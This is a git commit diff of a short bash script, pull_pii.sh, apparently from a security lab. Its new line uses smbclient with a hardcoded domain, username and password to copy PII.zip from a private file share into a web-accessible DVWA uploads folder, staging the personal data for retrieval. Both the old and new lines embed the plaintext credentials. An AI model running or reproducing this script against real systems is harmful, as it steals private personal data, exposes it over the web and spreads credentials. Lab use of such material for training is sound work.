066cf46cc1807d2651fa036ebd5952fc8f8c85d0
rnewt6926 <rnewt6926@gmail.com>
2022-09-23 20:21:21 -0500

    New

--- pull_pii.sh
+++ pull_pii.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-smbclient \\\\192.168.122.7\\Private_Files -W HACKYSOC -U wier --password=frantic-Folly3
+smbclient '//192.168.122.7/Private_Files' -c 'lcd /var/www/html/dvwa/hackable/uploads; get PII.zip' -W HACKYSOC -U wier%frantic-Folly3 
